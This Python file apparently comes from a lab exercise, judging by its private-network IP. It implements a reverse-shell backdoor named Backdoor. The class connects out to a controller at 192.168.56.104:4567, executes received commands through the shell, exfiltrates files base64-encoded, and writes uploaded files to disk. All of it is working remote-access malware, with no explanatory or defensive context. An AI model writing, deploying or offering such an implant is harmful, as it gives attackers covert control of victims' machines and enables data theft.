import socket
import subprocess
import json
import os
import base64



class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

 




    def executing_commands(self,command):
        return subprocess.check_output(command,shell=True)






    def relaiable_send(self,data):
        try:
            json_data=json.dumps(data.decode("utf-8"))
            self.connection.send(json_data.encode("utf-8"))
        except AttributeError:
            json_data=json.dumps(data)
            self.connection.send(json_data.encode("utf-8"))
        except UnicodeDecodeError:
            json_data=json.dumps(data)
            self.connection.send(json_data)







    def relaiable_recv(self):
        json_data=b""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue






    def changing_dir(self,path):
        os.chdir(path)
        return "[+] Changing directory.."






    def read_file(self,path):
        with open(path,"rb" ) as file:
            return base64.b64encode(file.read())

    def write_file(self,path ,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+]upload successful"





    def run(self):
        while True:
            command=self.relaiable_recv()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command)>1:
                    command_result=self.changing_dir(command[1])

                elif command[0] == "download":
                    command_result=self.read_file(command[1])

                elif command[0] == "upload":
                    command_result=self.write_file(command[1],command[2])

                else:    
                    command_result=self.executing_commands(command)
            except Exception:
                command_result = "[-]Error"



            self.relaiable_send(command_result)




        



my_backdoor=Backdoor("192.168.56.104", 4567)
my_backdoor.run()



   
